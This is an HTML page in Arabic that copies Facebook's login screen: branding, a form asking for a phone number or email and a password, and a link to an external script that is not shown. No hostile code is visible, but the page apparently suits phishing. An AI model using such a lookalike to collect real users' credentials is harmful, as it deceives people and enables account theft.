
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
    <title>فيسبوك – تسجيل الدخول</title>
    <!-- Font Awesome 6 -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="main-container">
    <div class="language-selector">
        <div class="lang-dropdown" id="langSelector">
            <i class="fas fa-globe"></i>
            <span>العربية</span>
            <i class="fas fa-chevron-down"></i>
        </div>
    </div>

    <div class="brand-section">
        <div class="facebook-logo">
            <i class="fab fa-facebook"></i>
            <span class="fb-text">facebook</span>
        </div>
        
    </div>

    <div class="login-form">
        <form id="fbLoginForm">
            <div class="input-group">
                <input type="text" id="emailPhone" name="email_phone" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" autocomplete="username" required>
                <div class="input-icon"><i class="fas fa-envelope"></i></div>
            </div>
            <div class="input-group">
                <input type="password" id="password" name="password" placeholder="كلمة السر" autocomplete="current-password" required>
                <div class="input-icon"><i class="fas fa-lock"></i></div>
            </div>
            <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
            <div id="formMessage" class="form-message"></div>
            <div class="forgot-link"><a href="#" id="forgotPassword">هل نسيت كلمة السر؟</a></div>
            <div class="divider"></div>
            <a href="#" id="createAccount" class="new-account-btn">إنشاء حساب جديد</a>
        </form>
    </div>

   

    <div class="footer-links">
        <div class="footer-row">
            <a href="#">سياسة الخصوصية</a>
            
            
           
      </span><span>© 2026</span></div>
    </div>
</div>

<script src="script.js"></script>
</body>
</html>
